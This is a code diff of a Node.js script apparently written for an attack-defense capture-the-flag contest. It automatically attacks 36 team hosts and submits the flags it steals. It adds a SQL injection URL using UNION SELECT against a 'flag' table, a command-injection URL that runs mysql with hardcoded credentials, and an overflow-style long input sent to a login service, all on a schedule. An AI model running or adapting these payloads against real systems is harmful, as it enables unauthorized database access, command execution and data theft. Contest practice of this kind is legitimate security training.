@@ -26,68 +26,108 @@ var parseFlag = function (regex, data) {
 
 
 //
-//  PMC Injection
+//  PMC name search injection
 //
 
-// assembles injection code
-var genInjectionCode = function (team) {
-    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
-}
 // regex for flag scrawling
-var regexPMCNameFlag = /\>\d* (\w*)\<\/div\>/;
-
-var attackPMC = function (team) {
-    var req = http.request(genInjectionCode(team), function (res) {
+var pmcNameSearchInjectionRegex = /\>\d* (\w*)\<\/div\>/;
+var pmcNameSearchInjection = function (team) {
+    var url = "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
+    var req = http.request(url, function (res) {
         res.setEncoding('utf8');
         res.on('data', function (data) {
-            flag = parseFlag(regexPMCNameFlag, data)
-            if (parseFlag(regexPMCNameFlag, data)) {
+            flag = parseFlag(pmcNameSearchInjectionRegex, data)
+            if (flag) {
                 console.log('FLAG: '.yellow, team, flag);
                 submit(flag);
+                req.destroy();
             }
         });
 
     });
     req.on('error', function(e) {
-      console.log('ERROR: '.red + e.message);
+        console.log('ERROR: '.red + e.message);
+        req.destroy();
+    });
+    req.setTimeout(10000, function () {
+        console.log('TIMEOUT: '.red);
+        req.destroy();
     });
     req.end();
 }
 
 
 //
-//  SSP Login Attack
+//  PMC db passthru shit
 //
 
-var regexSSPLoginFlag = /Exit\n#(\w+)/
-var attackSSP = function (team) {
+var pmcDBPassthruRegex = /id\s+flag\s*\d+\s*(\w+)/
+var pmcDBPassthru = function (team) {
+    var url = "http://10.8." + team.toString() + ".100:7788/menu.php/db/passthru/?=;%20mysql%20-D%20pmc%20-u%20joy%20-pchansey%20-e%20%22SELECT%20*%20from%20flag%22";
+    var req = http.request(url, function (res) {
+        res.setEncoding('utf8');
+        res.on('data', function (data) {
+            flag = parseFlag(pmcDBPassthruRegex, data)
+            if (flag) {
+                console.log('FLAG: '.yellow, team, flag);
+                submit(flag);
+                req.destroy();
+            }
+        });
+
+    });
+    req.on('error', function(e) {
+        console.log('ERROR: '.red + e.message);
+        req.destroy();
+    });
+    req.setTimeout(10000, function () {
+        console.log('TIMEOUT: '.red);
+        req.destroy();
+    });
+    req.end();
+}
+
+
+//
+//  SSP login buffer overflow Attack
+//
+
+var sspLoginBufferOverflowRegex = /Exit\n#(\w+)/
+var sspLoginBufferOverflow = function (team) {
     var target = {
         port: 5566,
         host: '10.8.' + team.toString() + '.100'
     };
 
-    var conn = net.connect(target, function () {
-        conn.write('11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1\n3\n8\n');
+    var req = net.connect(target, function () {
+        req.write('11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1\n3\n8\n');
     });
 
-    conn.on('data', function(data) {
-        result = parseFlag(regexSSPLoginFlag, data);
+    req.on('data', function(data) {
+        result = parseFlag(sspLoginBufferOverflowRegex, data);
         if (result) {
             console.log('Flag: '.yellow, team, result);
             submit(result);
+            req.destroy();
         }
     });
-
-    conn.on('error', function(e) {
-      console.log('ERROR: '.red + e.message);
+    req.on('error', function(e) {
+        console.log('ERROR: '.red + e.message);
+        req.destroy();
     });
+    req.setTimeout(10000, function () {
+        console.log('TIMEOUT: '.red);
+        req.destroy();
+    });
+
 };
 
 var attackAll = function () {
     console.log('====== START ATTACKING ====='.red);
     for (i = 0; i < 36; i++) {
-        attackPMC(i);
-        // attackSSP(i);
+        pmcNameSearchInjection(i);
+        pmcDBPassthru(i);
+        sspLoginBufferOverflow(i);
     }
 };
 
@@ -109,7 +149,7 @@ if (program.minute) {
 }
 
 if (program.now) {
-    attackAll();
+    attackAll(program);
 } else {
     var j = schedule.scheduleJob(rule, attackAll);
 }
